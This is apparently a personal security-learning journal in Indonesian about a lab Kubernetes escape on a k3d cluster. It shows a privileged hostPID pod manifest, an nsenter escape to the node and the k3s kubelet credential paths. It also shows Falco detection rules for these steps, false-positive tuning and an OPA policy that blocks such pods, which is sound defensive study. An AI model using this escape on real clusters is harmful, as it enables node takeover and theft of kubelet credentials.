# Hari 52 — Red Team: K8s Escape

**📅 Tanggal:** 2026-07-31
**⏱️ Durasi Belajar:** ~90 menit
**🏷️ Fase:** Fase 4 — Vulnerability Management & Red Teaming
**📊 Status:** ✅ Selesai

---

## 🎯 Tujuan Hari Ini

- [x] Deploy "bad pod" (privileged + hostPID) di namespace `default` — lolos dari OPA yang hanya enforce di `securebank`
- [x] Eksploitasi `nsenter` untuk escape ke node K8s (k3d server)
- [x] Baca kredensial node: `kubelet.kubeconfig` + `client-kubelet.crt/key`
- [x] Verifikasi deteksi Falco (privileged, setns, kubelet credential read)
- [x] Alert CRITICAL → webhook receiver → Slack `#security-alerts`
- [x] Temukan + perbaiki gap OPA: privileged pod ternyata TIDAK diblokir di `securebank`
- [x] Cleanup + dokumentasi

---

## ✅ Yang Berhasil Dikerjakan

### 1. Deploy Attacker Pod (Default Namespace)

Buat `securebank-api/k8s/redteam-pod.yaml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: default
spec:
  hostPID: true
  containers:
  - name: attacker
    image: alpine:3.20
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
```

**Catatan penting:** tutorial asli hanya pakai `privileged: true`. Saat dicoba, `nsenter -t 1` hanya menembus PID 1 **di dalam pod** (`sleep`), bukan host — karena pod punya PID namespace sendiri. `hostname` tetap `attacker-pod`. Solusinya tambah `hostPID: true` agar PID 1 host (k3s) terlihat. Kombinasi `privileged + hostPID` = primitif escape klasik yang dipakai exploit nyata.

Pod ter-schedule di `k3d-securebank-server-0` (agent nodes NotReady) — kebetulan node yang sama dengan pod Falco aktif.

### 2. Escape via nsenter

```bash
kubectl exec attacker-pod -n default -- nsenter -t 1 -m -u -n -i sh -c 'hostname'
# => k3d-securebank-server-0   (bukan attacker-pod lagi!)
```

Escape BERHASIL: sudah berada di mount/UTS/net namespace node, sebagai `root`.

### 3. Baca Kredensial Node

Path kubeadm `/etc/kubernetes/kubelet.conf` **tidak ada di k3s/k3d**. k3s simpan di:

```
/var/lib/rancher/k3s/agent/kubelet.kubeconfig
/var/lib/rancher/k3s/agent/client-kubelet.crt
/var/lib/rancher/k3s/agent/client-kubelet.key
```

Kredensial kubelet berhasil dibaca — ini setara dengan `kubelet.conf` di kubeadm. Attacker punya identitas node `system:node:k3d-securebank-server-0` untuk call ke K8s API.

### 4. Deteksi Falco — Awalnya MISS

Setelah upgrade rules, kenyataannya: **Falco awalnya tidak mendeteksi apa-apa**. Investigasi menemukan:

- Ruleset yang termuat hanya **26 rules** (versi minimal yang dibundle image), bukan full default (~300+ rules)
- `falcoctl` gagal download rules dari repo `falcosecurity/rules` (cluster tanpa internet)
- Akibatnya rule `Launch Privileged Container`, `Change thread namespace` (setns), dll. **tidak ada**

**Fix:** tambah 3 rule baru di `securebank-api/security/falco-rules/securebank-rules.yaml`:

| Rule | Prioritas | Kondisi |
|------|-----------|---------|
| `Privileged container launched (K8s escape enabler)` | CRITICAL | `container.privileged=true` |
| `Container escape via setns (nsenter)` | CRITICAL | `evt.type=setns and proc.name=nsenter` |
| `Read kubelet credentials post-escape` | CRITICAL | `open_read` pada file kubelet (exact match) |

### 5. False Positive Marathon 🚨

Rule kubelet pertama kali ditulis dengan prefix match:

```
fd.name startswith /var/lib/rancher/k3s/agent
```

**SALAH.** containerd menyimpan rootfs semua container di `/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/.../fs/`. Setiap I/O baca file container = read snapshot path → **1000+ FP CRITICAL ke Slack** dalam beberapa menit.

**Fix 1:** match nama file persis:

```
fd.name endswith kubelet.kubeconfig or
fd.name endswith client-kubelet.crt or
fd.name endswith client-kubelet.key
```

**Fix 2:** ternyata k3s/kubelet sendiri baca `client-kubelet.crt/key` berkali-kali untuk cert rotation → masih FP (8 alert/2 menit, `container=host`). Tambah condition `container` — hanya trigger kalau baca dari **dalam container**, bukan host process. k3s internal reads (`container=host`) excluded; attacker pod reads (`container=attacker`) tetap terdeteksi (proses nsenter tetap di cgroup container meskipun pindah namespace).

**Setelah fix 1+2:** 0 FP, true positive tetap fire.

### 6. Deteksi Berhasil (Setelah Rules Diperbaiki)

Re-deploy pod attacker + jalankan ulang escape. Falco mencatat 3 alert CRITICAL:

```
Critical ALERT: Privileged container launched
  (user=root container=attacker image=docker.io/library/alpine pod=attacker-pod namespace=default)

Critical ALERT: Container escape via setns/nsenter
  (proc=nsenter command=nsenter -t 1 -m -u -n -i sh -c '...' pod=attacker-pod namespace=default)

Critical ALERT: Kubelet credentials read
  (file=/var/lib/rancher/k3s/agent/client-kubelet.crt ...)
  (file=/var/lib/rancher/k3s/agent/client-kubelet.key ...)
```

Semua alert diteruskan: Falco → falcosidekick → webhook receiver (`:5678`) → Slack `#security-alerts`. Beberapa POST kena rate limit Slack (HTTP 429) karena flood alert dari fase FP + multiple events — pipeline tetap jalan.

### 7. Bonus Temuan: Gap OPA Gatekeeper ⚠️

Tutorial mengasumsikan OPA memblokir pod privileged di `securebank`. **Kenyataannya TIDAK.**

Test deploy pod privileged + hostPID di `securebank` (dengan resource limits agar lolos constraint pertama):

```
Error from server (Forbidden): [require-resource-limits] ...   # hanya resource limits yang dicek
pod/attacker-pod-blocked created                                # privileged LOLOS!
```

**Akar masalah:** Gatekeeper cuma punya 1 constraint — `require-resource-limits`. Tidak ada policy untuk `privileged: true` atau `hostPID`.

**Fix:** tambah `constraint-templates/deny-privileged.yaml` + `constraints/deny-privileged.yaml` (rego check `securityContext.privileged` + `hostPID`). Setelah apply:

```
Error from server (Forbidden): admission webhook "validation.gatekeeper.sh" denied:
  [deny-privileged] Container 'attacker' is privileged (privileged: true) — K8s escape risk
  [deny-privileged] Pod sets hostPID: true — host PID namespace access is a K8s escape risk
```

Gap ditutup. ✅

---

## 🧪 Hasil Checklist

| Checklist | Hasil |
|-----------|-------|
| Attacker pod (privileged) berhasil di-deploy | ✅ default namespace |
| Eksploitasi nsenter berhasil menembus ke node | ✅ `hostname` = `k3d-securebank-server-0`, root |
| Falco mencatat aktivitas tidak wajar | ✅ 3 rule CRITICAL (setelah rules ditambahkan) |

---

## 📝 Catatan Teknis

### Ruleset Falco "Slim" — Kenapa Terjadi
Falco helm chart men-deploy `falcoctl` sidecar untuk install rules dari artifact repo. Cluster k3d ini **tidak punya internet**, download gagal → hanya 26 rules minimal dari image yang aktif. Ini penting: **detection coverage tergantung ruleset yang benar-benar ter-load**, bukan yang "seharusnya". Verifikasi selalu dengan `grep rule: /etc/falco/falco_rules.yaml`.

### Attribution Post-Escape
Alert `Kubelet credentials read` muncul dengan `container=host pod=<NA>` — setelah nsenter, proses pindah namespace, Falco kehilangan atribusi ke pod (cgroup tetap sama tapi container lookup gagal). Tapi alert `setns/nsenter` tetap ter-attribusi benar ke `attacker-pod`. **Escape memutus atribusi, tapi primitive-nya (setns) terdeteksi lebih dulu.**

### daemonset rollout "stuck"
Agent nodes k3d `NotReady` sejak lama → pod lama Falco di agent stuck `Terminating` → daemonset rolling update tidak jalan. Solusi: force-delete pod lama + tunggu controller recreate di server-0.

---

## 🚧 Hambatan & Solusi

| Hambatan | Solusi |
|----------|--------|
| `nsenter -t 1` tidak menembus host (hanya PID 1 pod) | Tambah `hostPID: true` — primitif escape klasik |
| `/etc/kubernetes/kubelet.conf` tidak ada (k3s bukan kubeadm) | k3s: `/var/lib/rancher/k3s/agent/kubelet.kubeconfig` |
| Falco tidak mendeteksi apapun (26-rule minimal) | Tambah 3 rule custom; falcoctl download rules gagal tanpa internet |
| 1000+ FP alert kubelet (containerd snapshot path) | Exact filename match, bukan prefix dir |
| OPA tidak memblokir pod privileged | Tambah constraint `deny-privileged` (privileged + hostPID) |
| daemonset rollout stuck (agent NotReady) | Force-delete pod lama |

---

## 📤 Output Hari Ini

- [x] `securebank-api/k8s/redteam-pod.yaml` — attacker pod (privileged + hostPID)
- [x] 3 rule Falco baru: privileged container, setns escape, kubelet credential read
- [x] FP kubelet rule diperbaiki (prefix → exact filename)
- [x] Escape berhasil + kredensial kubelet dibaca + Falco deteksi + Slack alert
- [x] Gap OPA ditemukan & ditutup: `deny-privileged` constraint
- [x] Cleanup: attacker pod dihapus

---

## 💡 Pelajaran Baru

- **"Rules loaded" ≠ "rules harusnya ada".** Falco 26 rule vs 300+ rule. Selalu verifikasi ruleset yang aktif sebelum menilai detection coverage.
- **Privileged pod tanpa hostPID tidak cukup** untuk nsenter escape — PID namespace tetap terisolasi. Kombinasi privileged + hostPID adalah escape vector nyata, dan itulah yang wajib diblokir OPA.
- **Detection rules harus presisi.** Prefix match pada direktori yang dipakai containerd internals = false positive tsunami. Match file spesifik untuk kredensial.
- **Red team menemukan yang blue team tidak sadari.** Asumsi "OPA blokir privileged" ternyata salah — tidak ada constraint-nya. Trust tapi verify, bahkan terhadap konfigurasi sendiri.

---

## 🔗 Referensi

- [Day 41](hari-41.md) — Falco attack simulation (dasar)
- [Day 48](hari-48.md) — Alert routing Slack via webhook receiver
- [Falco Default Rules](https://github.com/falcosecurity/rules)
- [Change thread namespace (setns) — Falco rule](https://falco.org/docs/rules/)
- [K8s Hardening Guide — Privileged containers](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Falco Helm Chart Custom Rules](https://github.com/falcosecurity/charts/tree/master/charts/falco#custom-rules)

---

## 📈 Mood & Energi

| Aspek | Skor (1–5) | Catatan |
|-------|-----------|---------|
| Semangat belajar | 5 | Red team sukses escape, dan menemukan gap OPA nyata |
| Pemahaman materi | 5 | nsenter namespace mechanics, ruleset coverage, rego policy |
| Progres sesuai target | 5 | Escape + deteksi + gap fix + FP fix, semua tuntas |

---

## ➡️ Rencana Besok

- [ ] **Day 53: Red Team — Leaked Credentials** — IAM user sementara, leak key, observasi CloudTrail, script auto-revoke

---

*[← Hari 51](hari-51.md) | [Hari 53 →](hari-53.md)*
